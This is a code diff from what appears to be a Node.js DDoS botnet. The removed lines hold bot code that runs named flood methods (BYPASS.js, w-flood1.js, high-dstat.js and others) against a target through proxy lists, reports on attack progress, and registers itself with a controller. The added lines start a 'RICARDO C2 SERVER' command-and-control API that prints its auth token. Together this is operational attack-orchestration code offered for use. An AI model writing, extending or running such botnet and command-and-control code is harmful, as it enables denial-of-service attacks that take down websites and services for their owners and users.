-        execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
-        execWithLog(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
-        execWithLog(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
-        execWithLog(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
-        execWithLog(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
-        break;
-      case 'HOLD-PANEL':
-        execWithLog(`node methods/http-panel.js ${target} ${time}`);
-        break;
-      case 'R1':
-        execWithLog(`node methods/vhold.js ${target} ${time} 15 2 proxy.txt`);
-        execWithLog(`node methods/high-dstat.js ${target} ${time} 64 2 proxy.txt`);
-        execWithLog(`node methods/cibi.js ${target} ${time} 4 2 proxy.txt`);
-        execWithLog(`node methods/BYPASS.js ${target} ${time} 16 2 proxy.txt`);
-        execWithLog(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
-        execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
-        execWithLog(`node methods/vhold.js ${target} ${time} 16 2 proxy.txt`);
-        execWithLog(`node methods/nust.js ${target} ${time} 32 3 proxy.txt`);
-        break;
-      case 'UAM':
-        execWithLog(`node methods/uam.js ${target} ${time} 5 4 6`);
-        break;
-      case 'W.I.L':
-        execWithLog(`node methods/wil.js ${target} ${time} 10 8 4`);
-        break;
-      default:
-        console.log(color(`❌ Unknown method: ${methods}`, colors.red));
-    }
-
-    // After attack ends, send report
-    setTimeout(() => {
-      if (requestCount > 0) {
-        sendReport(target, methods, requestCount, time);
-      }
-    }, (parseInt(time) * 1000) + 2000);
-  }
-
-  // Health endpoint
-  app.get('/health', (req, res) => {
-    res.json({
-      status: 'online',
-      botId: BOT_ID,
-      uptime: process.uptime(),
-      totalRequests,
-      proxies: proxyList.length,
-      userAgents: uaList.length,
-      currentAttack: currentAttack ? {
-        target: currentAttack.target,
-        method: currentAttack.methods,
-        duration: Math.floor((Date.now() - attackStartTime) / 1000),
-        requests: requestCount
-      } : null
-    });
-  });
-
-  app.get('/ping', (req, res) => {
-    res.json({ alive: true, botId: BOT_ID, uptime: process.uptime(), timestamp: Date.now(), totalRequests });
-  });
-
-  app.listen(PORT, async () => {
-    loadProxies();
-    loadUserAgents();
-    console.log(color(`🤖 Bot HTTP server listening on port ${PORT}`, colors.green));
-    console.log(color('⏳ Starting auto-registration in 3 seconds...\n', colors.cyan));
-    setTimeout(() => autoRegister(), 3000);
-  });
-}
-
-startBot().catch(error => {
-  console.error(color('Failed to start bot:', colors.red), error);
-  process.exit(1);
+// Start server
+app.listen(port, () => {
+  console.log('\n========================================');
+  console.log('🚀 RICARDO C2 SERVER STARTED (API ONLY)');
+  console.log('========================================');
+  console.log(`📍 Listening on port ${port}`);
+  console.log(`🔑 Auth Token: ${AUTH_TOKEN}`);
+  console.log(`📊 Live Stats: ENABLED`);
+  console.log(`🔥 RAW-GET method ready (no proxy required)`);
+  console.log('========================================\n');
+  
+  if (!fs.existsSync('./proxy.txt')) fs.writeFileSync('./proxy.txt', '# Add your proxies here\n# Format: ip:port\n');
+  console.log('📁 Required files:');
+  console.log('   - /methods/ - attack scripts (auto-created)');
+  console.log('   - proxy.txt - add your proxies (one per line)\n');
 });
